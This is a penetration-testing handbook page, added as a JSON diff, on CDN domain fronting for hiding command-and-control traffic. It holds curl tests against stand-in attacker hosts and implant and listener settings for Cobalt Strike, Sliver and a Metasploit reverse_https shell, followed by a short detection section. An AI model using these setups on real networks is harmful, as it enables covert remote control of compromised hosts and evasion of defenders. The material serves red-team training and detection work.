@@ -1,0 +1,274 @@
+{
+    "title": "CDN - Domain Fronting",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Cloud",
+            "url": "/enumeration/cloud"
+        }
+    ],
+    "sections": [
+        {
+            "heading": "How It Works",
+            "type": "code_block",
+            "content": [
+                "1. Attacker's C2 and legitimate site share same CDN (e.g., CloudFront)",
+                "2. TLS SNI (outer) shows: legitimate-site.com",
+                "3. HTTP Host header (inner) shows: attacker-c2.com",
+                "4. CDN routes based on Host header, not SNI",
+                "5. Network monitoring sees traffic to \"legitimate-site.com\""
+            ]
+        },
+        {
+            "heading": "Finding Frontable Domains",
+            "subheadings": [
+                {
+                    "heading": "Automated Discovery",
+                    "type": "code_block",
+                    "content": [
+                        "# FindFrontableDomains",
+                        "# https://github.com/rvrsh3ll/FindFrontableDomains",
+                        "python3 FindFrontableDomains.py -d target-cdn.net",
+                        "",
+                        "# Domain Fronting Tools",
+                        "# https://github.com/stevecoward/domain-fronting-tools",
+                        "python3 finder.py --cdn cloudfront",
+                        "",
+                        "# DomainFrontingLists (pre-compiled lists)",
+                        "# https://github.com/vysecurity/DomainFrontingLists"
+                    ]
+                },
+                {
+                    "heading": "Manual Testing",
+                    "type": "code_block",
+                    "content": [
+                        "# Test if domain fronting works",
+                        "# Replace SNI with legitimate domain, Host with your domain",
+                        "",
+                        "# Using curl",
+                        "curl -H \"Host: your-c2.cloudfront.net\" https://legitimate.cloudfront.net/",
+                        "",
+                        "# If you get response from your-c2 → Domain fronting works",
+                        "",
+                        "# Test with different CDNs",
+                        "for domain in $(cat frontable_domains.txt); do",
+                        "    curl -s -H \"Host: your-c2.com\" \"https://$domain/\" | head -1",
+                        "done"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "CDN-Specific Techniques",
+            "subheadings": [
+                {
+                    "heading": "Amazon CloudFront",
+                    "type": "code_block",
+                    "content": [
+                        "# Find CloudFront distributions",
+                        "dig domain.com | grep cloudfront",
+                        "",
+                        "# Test fronting",
+                        "curl -H \"Host: attacker.cloudfront.net\" https://legitimate.cloudfront.net/path",
+                        "",
+                        "# Note: AWS has restricted domain fronting as of 2018",
+                        "# But some edge cases may still work"
+                    ]
+                },
+                {
+                    "heading": "Azure CDN",
+                    "type": "code_block",
+                    "content": [
+                        "# Azure Front Door domains",
+                        "*.azurefd.net",
+                        "*.azureedge.net",
+                        "",
+                        "# Test",
+                        "curl -H \"Host: attacker.azurefd.net\" https://legitimate.azurefd.net/"
+                    ]
+                },
+                {
+                    "heading": "Google Cloud CDN",
+                    "type": "code_block",
+                    "content": [
+                        "# Google has blocked domain fronting since 2018",
+                        "# Alternative: Use App Engine with custom domains"
+                    ]
+                },
+                {
+                    "heading": "Fastly",
+                    "type": "code_block",
+                    "content": [
+                        "# Fastly domains",
+                        "*.fastly.net",
+                        "*.global.ssl.fastly.net",
+                        "",
+                        "curl -H \"Host: attacker.global.ssl.fastly.net\" https://legitimate.global.ssl.fastly.net/"
+                    ]
+                },
+                {
+                    "heading": "Cloudflare",
+                    "type": "code_block",
+                    "content": [
+                        "# Cloudflare domains",
+                        "*.cloudflare.com",
+                        "",
+                        "# Note: Cloudflare has mitigations in place",
+                        "# Workers may be alternative approach"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "TLS 1.3 Considerations",
+            "type": "code_block",
+            "content": [
+                "# TLS 1.3 encrypts more of the handshake",
+                "# SNI is still visible unless using ECH (Encrypted Client Hello)",
+                "",
+                "# Noctilucent - TLS 1.3 Domain Fronting",
+                "# https://github.com/SixGenInc/Noctilucent",
+                "# Exploits TLS 1.3 session resumption"
+            ]
+        },
+        {
+            "heading": "C2 Framework Integration",
+            "subheadings": [
+                {
+                    "heading": "Cobalt Strike",
+                    "type": "code_block",
+                    "content": [
+                        "# Malleable C2 profile for domain fronting",
+                        "http-get {",
+                        "    set uri \"/search\";",
+                        "    client {",
+                        "        header \"Host\" \"your-c2.cloudfront.net\";",
+                        "    }",
+                        "}",
+                        "",
+                        "# Listener setup:",
+                        "# Host: legitimate.cloudfront.net",
+                        "# Host Header: your-c2.cloudfront.net"
+                    ]
+                },
+                {
+                    "heading": "Sliver",
+                    "type": "code_block",
+                    "content": [
+                        "# Generate implant with domain fronting",
+                        "sliver > https -d legitimate.cloudfront.net -H your-c2.cloudfront.net",
+                        "",
+                        "# Or in implant config",
+                        "sliver > generate --http legitimate.cloudfront.net --http-header \"Host:your-c2.cloudfront.net\""
+                    ]
+                },
+                {
+                    "heading": "Metasploit",
+                    "type": "code_block",
+                    "content": [
+                        "# Reverse HTTPS with domain fronting",
+                        "use exploit/multi/handler",
+                        "set PAYLOAD windows/meterpreter/reverse_https",
+                        "set LHOST your-c2.cloudfront.net",
+                        "set HttpHostHeader legitimate.cloudfront.net",
+                        "set OverrideRequestHost true"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Detection & Defense",
+            "type": "code_block",
+            "content": [
+                "# Indicators to monitor:",
+                "1. Mismatch between SNI and Host header",
+                "2. Unusual CDN traffic patterns",
+                "3. Long-lived HTTPS sessions to CDN edges",
+                "4. POST requests to CDN (vs typical GET for static content)",
+                "",
+                "# Defensive measures:",
+                "1. Block known CDN IP ranges (drastic)",
+                "2. SSL/TLS inspection to compare SNI vs Host",
+                "3. Monitor for C2 framework signatures in traffic",
+                "4. Analyze CDN logs for suspicious patterns"
+            ]
+        },
+        {
+            "heading": "Alternatives When Fronting Fails",
+            "type": "code_block",
+            "content": [
+                "# CDN as redirector",
+                "# Set up CDN to proxy to your actual C2",
+                "",
+                "# Serverless redirectors",
+                "# Use Lambda@Edge, Cloudflare Workers to redirect",
+                "",
+                "# Legitimate cloud services",
+                "# Use Azure Blob, S3 buckets as dead drops"
+            ]
+        },
+        {
+            "heading": "Tools",
+            "type": "code_block",
+            "content": [
+                "# Domain Fronting Finder",
+                "https://github.com/rvrsh3ll/FindFrontableDomains",
+                "",
+                "# Domain Fronting Tools",
+                "https://github.com/stevecoward/domain-fronting-tools",
+                "",
+                "# TLS 1.3 Fronting",
+                "https://github.com/SixGenInc/Noctilucent",
+                "",
+                "# Pre-compiled Lists",
+                "https://github.com/vysecurity/DomainFrontingLists"
+            ]
+        },
+        {
+            "heading": "Related Topics",
+            "type": "list",
+            "content": [
+                "C2 Frameworks - C2 framework usage",
+                "RT/EDR Evasion - Evasion techniques",
+                "SSRF - CDN can be SSRF target"
+            ]
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2026-02-03T14:05:45.496Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/cloud/cdn-comain-fronting.md",
+        "previous_page": {
+            "title": "Serverless Security",
+            "url": "/enumeration/cloud/serverless"
+        },
+        "next_page": {
+            "title": "Cloud AI Security",
+            "url": "/enumeration/cloud/cloud-ai-security"
+        }
+    }
+}
